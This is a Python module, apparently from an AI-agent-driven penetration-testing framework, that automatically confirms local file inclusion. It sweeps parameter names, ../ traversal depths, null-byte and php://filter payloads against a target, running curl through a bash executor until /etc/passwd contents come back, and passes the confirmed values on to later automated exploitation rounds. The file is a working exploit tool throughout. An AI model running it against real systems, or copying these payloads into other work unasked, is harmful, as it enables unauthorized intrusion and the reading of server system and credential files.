"""
lfi_probe.py — Serial, deterministic LFI parameter/depth/style resolver.

Run this **before** any Skill or ReAct exploitation attempt on an LFI-ish
finding.  It performs a capped, *sequential* sweep:

    for param × for style × for depth:
        one HTTP request
        if /etc/passwd structure detected → return (param, depth, style)

The caller is expected to merge the returned facts into
``state.confirmed_facts["lfi"]`` so all subsequent Skill/ReAct rounds
reuse the locked values.  Concurrency is intentionally avoided — the
previous failure mode was the model firing 80+ parallel requests,
getting 20 KB of identical HTML back, and concluding "no echo".

Budget: ``max_probes`` (default 40) total requests.  After that we
return ``status="unconfirmed"`` and let the caller fall back to ReAct
(with one less round) or skip.
"""
from __future__ import annotations

import logging
import re
import shlex
from dataclasses import dataclass, field
from typing import Any, Optional
from urllib.parse import urlparse, urlunparse

from backend.agents.evidence_verifier import _passwd_content_detected
from backend.agents.models import VulnFinding
from backend.tools.executor import ToolExecutor

logger = logging.getLogger(__name__)


_CANDIDATE_PARAMS: list[str] = [
    "page", "file", "include", "path", "image",
    "content", "template", "doc", "folder", "view",
]
_CANDIDATE_DEPTHS: list[int] = list(range(1, 11))
_CANDIDATE_STYLES: list[str] = ["absolute", "relative", "php_filter"]

_DEFAULT_MAX_PROBES = 40


@dataclass
class LfiProbeResult:
    status: str                # "confirmed" | "unconfirmed" | "not_applicable"
    param: Optional[str] = None
    depth: Optional[str] = None
    style: Optional[str] = None
    probed_count: int = 0
    evidence_excerpt: str = ""
    attempts_log: list[str] = field(default_factory=list)

    def to_facts(self) -> dict[str, Any]:
        """Render as a ``confirmed_facts['lfi']`` sub-dict."""
        if self.status != "confirmed":
            return {}
        return {
            "param": self.param,
            "depth": self.depth,
            "style": self.style,
            "readable_files": ["/etc/passwd"],
        }


def _extract_base_url(url: str) -> tuple[str, str]:
    """Return (scheme://host[:port], path)."""
    parsed = urlparse(url)
    if not parsed.scheme:
        return "", url
    base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
    return base, parsed.path or "/"


def _build_payloads(param: str, base_path: str, style: str, depth: int) -> list[str]:
    """Build candidate payload URLs for (param, style, depth).

    base_path is the endpoint path (e.g. ``/antibot_image/antibots/info.php``)
    which we keep so existing page routes stay resolvable.
    """
    if style == "absolute":
        return [f"{base_path}?{param}=/etc/passwd"]
    if style == "relative":
        trav = "../" * depth
        return [
            f"{base_path}?{param}={trav}etc/passwd",
            f"{base_path}?{param}={trav}etc/passwd%00",
        ]
    if style == "php_filter":
        return [
            f"{base_path}?{param}=php://filter/convert.base64-encode/resource=/etc/passwd",
            f"{base_path}?{param}=php://filter/read=convert.base64-encode/resource=/etc/passwd",
        ]
    return []


def _depth_order_from_doc_root(doc_root: str) -> list[int]:
    """If doc_root is known, prefer depths near the theoretical value."""
    if not doc_root:
        return _CANDIDATE_DEPTHS
    parts = [p for p in doc_root.split("/") if p]
    theory = len(parts)
    preferred = [d for d in (theory - 1, theory, theory + 1, theory + 2) if 1 <= d <= 10]
    rest = [d for d in _CANDIDATE_DEPTHS if d not in preferred]
    return preferred + rest


def _decode_base64_maybe(body: str) -> str:
    """If body looks like a base64 blob (from php_filter), decode it so we can
    run the structural regex against the actual passwd content.
    """
    sample = body.strip()
    if not sample or len(sample) < 40:
        return body
    if not re.match(r'^[A-Za-z0-9+/=\s]+$', sample):
        return body
    try:
        import base64
        decoded = base64.b64decode(sample + "==", validate=False).decode(
            "utf-8", errors="ignore"
        )
        return decoded if "root" in decoded.lower() else body
    except Exception:
        return body


async def probe_lfi_depth(
    finding: VulnFinding,
    context: dict[str, Any],
    executor: Optional[ToolExecutor] = None,
    *,
    max_probes: int = _DEFAULT_MAX_PROBES,
) -> LfiProbeResult:
    """Serially confirm LFI (param, depth, style) or return ``unconfirmed``.

    ``context`` may contain ``php_runtime`` with a ``doc_root`` field; if
    present, we prefer depths near the theoretical value.
    """
    url = (finding.target or "").strip()
    if not url or "://" not in url:
        return LfiProbeResult(status="not_applicable")

    base_url, base_path = _extract_base_url(url)
    if not base_url:
        return LfiProbeResult(status="not_applicable")

    executor = executor or ToolExecutor()
    php_runtime = (context or {}).get("php_runtime") or {}
    doc_root = str(php_runtime.get("doc_root") or "")

    finding_param = getattr(finding, "param", None) or ""
    params: list[str] = []
    for p in [finding_param] + _CANDIDATE_PARAMS:
        p = (p or "").strip()
        if p and p not in params:
            params.append(p)

    depths = _depth_order_from_doc_root(doc_root)

    attempts = 0
    attempts_log: list[str] = []
    for style in _CANDIDATE_STYLES:
        for param in params:
            for depth in depths:
                if style == "absolute" and depth != 1:
                    continue
                if style == "php_filter" and depth != 1:
                    continue
                if attempts >= max_probes:
                    return LfiProbeResult(
                        status="unconfirmed",
                        probed_count=attempts,
                        attempts_log=attempts_log,
                    )

                payloads = _build_payloads(param, base_path, style, depth)
                for payload_path in payloads:
                    attempts += 1
                    if attempts > max_probes:
                        break
                    full = f"{base_url}{payload_path}"
                    safe = shlex.quote(full)
                    cmd = (
                        f"curl -s -k --max-time 6 "
                        f"-H 'User-Agent: Mozilla/5.0 lfi-probe/1.0' "
                        f"{safe}"
                    )
                    try:
                        result = await executor.run(
                            tool="/bin/bash",
                            args=["-c", cmd],
                            timeout=10,
                            record_purpose="lfi_depth_probe",
                        )
                    except Exception as exc:
                        attempts_log.append(f"{style}:{param}:{depth} → error: {exc}")
                        continue

                    body = (result.stdout or "")[:16384]
                    probed_body = (
                        _decode_base64_maybe(body) if style == "php_filter" else body
                    )
                    hit = _passwd_content_detected(probed_body)
                    attempts_log.append(
                        f"{style}:{param}:{depth} exit={result.exit_code} "
                        f"{len(body)}B hit={hit}"
                    )
                    if hit:
                        evidence = probed_body[:800]
                        logger.info(
                            f"[LfiProbe] 命中 param={param} depth={depth} "
                            f"style={style} (第 {attempts} 次探测)"
                        )
                        return LfiProbeResult(
                            status="confirmed",
                            param=param,
                            depth=str(depth) if style == "relative" else "0",
                            style=style,
                            probed_count=attempts,
                            evidence_excerpt=evidence,
                            attempts_log=attempts_log,
                        )

    return LfiProbeResult(
        status="unconfirmed",
        probed_count=attempts,
        attempts_log=attempts_log,
    )


def is_lfi_finding(finding: VulnFinding) -> bool:
    """Heuristic: should the LFI gate run for this finding?"""
    text = (
        (finding.name or "") + " " +
        (finding.description or "") + " " +
        (getattr(finding, "category", "") or "") + " " +
        (getattr(finding, "vuln_type", "") or "")
    ).lower()
    for marker in ("lfi", "file inclusion", "path traversal",
                   "directory traversal", "文件包含"):
        if marker in text:
            return True
    return False
